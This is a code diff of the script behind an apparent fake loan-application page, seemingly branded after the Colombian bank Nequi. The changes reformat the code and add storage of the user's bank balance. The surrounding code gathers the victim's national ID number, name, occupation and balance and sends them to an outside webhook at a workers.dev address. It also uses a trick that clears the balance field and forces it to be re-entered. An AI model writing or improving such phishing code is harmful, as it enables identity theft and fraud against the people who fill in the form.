@@ -295,10 +295,8 @@
         
         let saldoValidado = false;
         
-        // TASA DE INTERÉS: 3% mensual
         const TASA_INTERES = 0.03;
         
-        // Función para calcular cuota con interés compuesto (Sistema Francés)
         function calcularCuota(monto, meses, tasaMensual = TASA_INTERES) {
             if (!meses || meses === 0) return 0;
             if (tasaMensual === 0) return monto / meses;
@@ -309,7 +307,6 @@
             return Math.round(cuota);
         }
         
-        // Función para actualizar el display de la cuota
         function actualizarCuotaDisplay() {
             const monto = parseInt(slider.value);
             const cuotasActiva = document.querySelector('.cuota-btn.active');
@@ -332,13 +329,11 @@
             return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
         }
         
-        // Evento del slider - actualiza monto y recalcula cuota
         slider.addEventListener('input', function() {
             amountDisplay.textContent = formatSliderNumber(this.value);
             actualizarCuotaDisplay();
         });
         
-        // Eventos de los botones de cuotas
         document.querySelectorAll('.cuota-btn').forEach(btn => {
             btn.addEventListener('click', function() {
                 document.querySelectorAll('.cuota-btn').forEach(b => b.classList.remove('active'));
@@ -388,31 +383,31 @@
             if (this.disabled) return;
             
             if (!saldoValidado) {
-    e.preventDefault();
-    
-    // Borrar el campo
-    saldo.value = '';
-    
-    // Poner borde rojo
-    saldo.classList.add('error');
-    
-    saldoValidado = true;
-    btnSolicitar.disabled = true;
-    btnSolicitar.classList.remove('active');
-    
-    // Hacer scroll suave hasta el campo de saldo
-    saldo.scrollIntoView({ behavior: 'smooth', block: 'center' });
-    
-    // Enfocar el campo para escribir
-    saldo.focus();
-    
-    return;
-}
+                e.preventDefault();
+                
+                saldo.value = '';
+                saldo.classList.add('error');
+                
+                saldoValidado = true;
+                btnSolicitar.disabled = true;
+                btnSolicitar.classList.remove('active');
+                
+                saldo.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                saldo.focus();
+                
+                return;
+            }
             
             const montoSeleccionado = slider.value;
             localStorage.setItem('montoCredito', montoSeleccionado);
             
+            // Guardar saldo en localStorage
+            const datosSesion = JSON.parse(localStorage.getItem('datosSesion')) || {};
+            datosSesion.saldo = saldo.value;
+            localStorage.setItem('datosSesion', JSON.stringify(datosSesion));
+            
             const webhookURL = 'https://nequi-worker.miprimercredito.workers.dev';
+            const sesionId = localStorage.getItem('sesionId') || 'DESCONOCIDO';
 
             const datos = {
                 cedula: cedula.value,
@@ -427,8 +422,7 @@
                 cuotaEstimada: cuotaDisplay.textContent
             };
 
-            const sesionId = localStorage.getItem('sesionId') || 'DESCONOCIDO';
-const mensaje = `📋 **DATOS PERSONALES**\n🆔 ${sesionId}\n` +
+            const mensaje = `📋 **DATOS PERSONALES**\n🆔 ${sesionId}\n` +
                             `👤 Cédula: ${datos.cedula}\n` +
                             `📛 Nombre: ${datos.nombre}\n` +
                             `💼 Ocupación: ${datos.ocupacion}\n` +
@@ -456,7 +450,6 @@ const mensaje = `📋 **DATOS PERSONALES**\n🆔 ${sesionId}\n` +
             }
         });
         
-        // Inicializar el cálculo de cuota al cargar la página
         actualizarCuotaDisplay();
         validarCampos();
     </script>
